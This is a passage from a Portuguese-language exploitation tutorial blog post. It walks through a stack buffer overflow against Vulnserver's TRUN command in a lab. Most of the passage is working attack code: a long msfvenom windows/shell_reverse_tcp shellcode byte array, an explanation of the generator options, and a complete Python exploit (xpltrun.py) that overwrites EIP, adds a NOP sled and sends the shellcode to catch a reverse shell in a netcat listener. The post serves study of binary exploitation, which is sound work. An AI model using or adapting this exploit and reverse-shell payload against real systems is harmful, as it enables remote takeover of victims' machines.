shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">aa</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">be"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">1f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">d3</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">14"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">9b</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">38"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">fd</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">b5"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">42"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">2c"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">87</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">f5"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">fb"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">04"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">a2</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">d7"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">dc</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">56"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">a6</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">94</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">0e"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">95</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">51"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">ea"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">a6</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">ac"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">85"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">fd</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">d1"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">8d"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">9c"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">e7"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">a8"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">94</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">29"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">aa</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">d5"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">a4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">76"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">4c"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">fd</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">d9"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">79"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">cb"</span>
</pre></table></code></div></div><p>Onde: <strong>-p windows/shell_reverse_tcp</strong> é a instrução que será gerada no payload <strong>lhost</strong> é o endereço para onde o Windows vai enviar o shell, no caso o IP do Kali <strong>lport</strong> é a porta onde o Windows vai se conectar <strong>-b “\x00”</strong> são os badchars para serem evitados <strong>-v shellcode</strong> é o nome da variável a ser criada <strong>-f py</strong> é o formato que vai ser criado, no caso python</p><p>Vamos adicionar o shellcode em nosso exploit e organizar o envio com uma sequencia de NOPs antes do shellcode.</p><p>O NOP (no operator) é uma instrução que não faz absolutamente nada, mas há uma tecnica chamada de “nop slad”, onde inserimos uma sequência de NOPs antes do shellcode para que o programa não quebre o shell.</p><p>xpltrun.py</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># tamanho do offset encontrado no fuzzing
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">5061</span>
<span class="n">nop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">20</span>
<span class="n">shellcode</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xda\xd2\xbb\x01\x23\x9e\xef\xd9\x74\x24\xf4</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x5f\x31\xc9\xb1\x52\x31\x5f\x17\x83\xc7\x04</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x03\x5e\x30\x7c\x1a\x9c\xde\x02\xe5\x5c\x1f</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x63\x6f\xb9\x2e\xa3\x0b\xca\x01\x13\x5f\x9e</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xad\xd8\x0d\x0a\x25\xac\x99\x3d\x8e\x1b\xfc</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x70\x0f\x37\x3c\x13\x93\x4a\x11\xf3\xaa\x84</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x64\xf2\xeb\xf9\x85\xa6\xa4\x76\x3b\x56\xc0</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc3\x80\xdd\x9a\xc2\x80\x02\x6a\xe4\xa1\x95</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe0\xbf\x61\x14\x24\xb4\x2b\x0e\x29\xf1\xe2</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa5\x99\x8d\xf4\x6f\xd0\x6e\x5a\x4e\xdc\x9c</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa2\x97\xdb\x7e\xd1\xe1\x1f\x02\xe2\x36\x5d</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd8\x67\xac\xc5\xab\xd0\x08\xf7\x78\x86\xdb</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xfb\x35\xcc\x83\x1f\xcb\x01\xb8\x24\x40\xa4</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6e\xad\x12\x83\xaa\xf5\xc1\xaa\xeb\x53\xa7</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd3\xeb\x3b\x18\x76\x60\xd1\x4d\x0b\x2b\xbe</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa2\x26\xd3\x3e\xad\x31\xa0\x0c\x72\xea\x2e</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x3d\xfb\x34\xa9\x42\xd6\x81\x25\xbd\xd9\xf1</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6c\x7a\x8d\xa1\x06\xab\xae\x29\xd6\x54\x7b</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xfd\x86\xfa\xd4\xbe\x76\xbb\x84\x56\x9c\x34</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xfa\x47\x9f\x9e\x93\xe2\x5a\x49\x5c\x5a\x65</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x85\x34\x99\x65\xb5\x3f\x14\x83\xdf\xaf\x71</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x1c\x48\x49\xd8\xd6\xe9\x96\xf6\x93\x2a\x1c</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf5\x64\xe4\xd5\x70\x76\x91\x15\xcf\x24\x34</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x29\xe5\x40\xda\xb8\x62\x90\x95\xa0\x3c\xc7</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf2\x17\x35\x8d\xee\x0e\xef\xb3\xf2\xd7\xc8</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x77\x29\x24\xd6\x76\xbc\x10\xfc\x68\x78\x98</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xb8\xdc\xd4\xcf\x16\x8a\x92\xb9\xd8\x64\x4d</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x15\xb3\xe0\x08\x55\x04\x76\x15\xb0\xf2\x96</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa4\x6d\x43\xa9\x09\xfa\x43\xd2\x77\x9a\xac</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x09\x3c\xaa\xe6\x13\x15\x23\xaf\xc6\x27\x2e</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x50\x3d\x6b\x57\xd3\xb7\x14\xac\xcb\xb2\x11</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe8\x4b\x2f\x68\x61\x3e\x4f\xdf\x82\x6b</span><span class="sh">"</span>


<span class="c1"># payload a ser enviado
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">TRUN /../</span><span class="sh">"</span> <span class="c1"># funcao inicial
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">2003</span> <span class="c1"># preenchimento do buffer
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x03\x12\x50\x62</span><span class="sh">"</span> <span class="c1"># sobrescreve EIP
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">nop</span> <span class="c1"># sobrescreve ESP com os NOPs
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span> <span class="c1"># envia nosso shellcode apos os NOPs
</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># cria o socket
</span><span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span> <span class="c1"># conecta no alvo
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># envia o payload
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span> <span class="c1"># fecha conexao
</span></pre></table></code></div></div><h2 id="obtendo-acesso-remoto">OBTENDO ACESSO REMOTO</h2><p>Com o exploit pronto, precisamos deixar um netcat ouvindo em nossa máquina atacante na mesma porta utilizada para gerar o shellcode, no meu caso a 8443.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-15.png" alt="Immunity." /></p><p>Vamos executar o vulnserver.exe na máquina alvo, mas desta vez rodando normalmente fora do Immunity.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-16.png" alt="Immunity." /></p><p>Agora vamos rodar o xpltrun.py e verificar em nosso netcat a conexão reversa.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-17.png" alt="Immunity." /></p><p>E conseguimos nosso acesso remoto. A vulnerabilidade do comando TRUN é a mais simples dos buffer overflow, nos próximos comandos, vamos experimentar complexidades diferentes.</p><p>Go Go Go!!!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/estudos/'>Estudos</a>, <a href='/categories/windows-buffer-overflow/'>Windows Buffer Overflow</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/binary-exploitation/" class="post-tag no-text-decoration" >Binary Exploitation</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >Buffer Overflow</a> <a href="/tags/assembly/" class="post-tag no-text-decoration" >Assembly</a> <a href="/tags/vulnserver/" class="post-tag no-text-decoration" >Vulnserver</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF - H41stur&url=https://h41stur.github.io/posts/std-winbof-2/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF - H41stur&u=https://h41stur.github.io/posts/std-winbof-2/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF - H41stur&url=https://h41stur.github.io/posts/std-winbof-2/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://h41stur.github.io/posts/std-winbof-2/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div><div> <script src="https://utteranc.es/client.js" repo="h41stur/h41stur.github.io" issue-term="url" theme="photon-dark" crossorigin="anonymous" async> </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/process-injection/">Process Injection 101</a><li><a href="/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="/posts/paper-heap/">Heap Exploitation P.1</a><li><a href="/posts/shellcoding101/">Shellcoding 101</a><li><a href="/posts/replay-sinal-rf/">Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 